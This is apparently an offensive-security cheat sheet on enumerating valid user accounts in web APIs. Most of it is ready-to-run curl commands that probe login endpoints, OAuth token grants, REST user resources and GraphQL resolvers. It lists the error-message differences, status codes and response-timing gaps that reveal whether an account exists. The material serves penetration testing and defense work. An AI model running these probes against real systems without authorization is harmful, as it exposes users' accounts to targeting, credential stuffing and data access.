# API and GraphQL enumeration (deep) — the typed oracles

## The JSON error taxonomy

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"$KNOWN\",\"password\":\"x\"}" "$BASE/api/login" | python3 -m json.tool
```

The field that carries the distinction:
- `{"error":"user_not_found"}` vs `{"error":"bad_password"}` — direct
- `{"error":"invalid_credentials","code":1001}` vs `{"code":1002}` — a code
- `{"message":"No account"}` vs `{"message":"Wrong password"}`
- `{"success":false,"reason":"no_user"}` vs `{"reason":"bad_pass"}`
- `{"detail":"..."}` — a detail field
- `{"attempts_remaining":4}` — a counter that only a real row carries
- `{"user_exists":true}` — a direct boolean
- `404 {"detail":"user not found"}` vs `401 {"detail":"invalid"}` —
  the status+body pair

## The token/OAuth grant

```bash
curl -s -X POST -d "grant_type=password&username=$KNOWN&password=x&client_id=x" "$BASE/oauth/token"
curl -s -X POST -d "grant_type=password&username=$FAKE&password=x&client_id=x"  "$BASE/oauth/token"
```

RFC 6749: `invalid_grant` for a bad password, but an app may return
`invalid_client`/`invalid_request`/a typed sub-error for a bad user, or
a `error_description` that names the account.

## The REST user-resource — the direct oracle

```bash
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$KNOWN"
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$FAKE"
curl -s "$BASE/api/users/$KNOWN"   # a 200 returns the object -> web-idor
```

- `200` vs `404` — the existence oracle
- a `200`'s body → `web-idor` (the object is owned/readable)
- `GET /api/users/` — a public user list (the WP `/wp-json` pattern)

## GraphQL — the resolvers

```bash
# exists-resolvers
curl -s -X POST -H 'Content-Type: application/json' -d '{"query":"query{userByEmail(email:\"'$U'\"){id}}"}' "$BASE/graphql"
curl -s -X POST -H 'Content-Type: application/json' -d '{"query":"query{checkUser(username:\"'$U'\"){exists}}"}' "$BASE/graphql"
curl -s -X POST -H 'Content-Type: application/json' -d '{"query":"query{userExists(email:\"'$U'\")}"}' "$BASE/graphql"
# the login mutation
curl -s -X POST -H 'Content-Type: application/json' -d '{"query":"mutation{login(username:\"'$U'\",password:\"x\"){token}}"}' "$BASE/graphql"
```

- `{"data":{"userByEmail":null}}` vs `{"data":{"userByEmail":{"id":N}}}`
- `{"data":{"userExists":false}}` — direct
- `errors[].extensions.code` — `"USER_NOT_FOUND"` vs `"INVALID_CREDENTIALS"`
- a `User`/`AuthError` union type exposing the distinction
- introspection (`__schema`) reveals whether these resolvers exist

## The API timing channel

```bash
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$KNOWN\",\"password\":\"x\"}" "$BASE/api/login"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$FAKE\",\"password\":\"x\"}" "$BASE/api/login"
done
```

The same hash asymmetry — the JSON API hashes only for a real user.
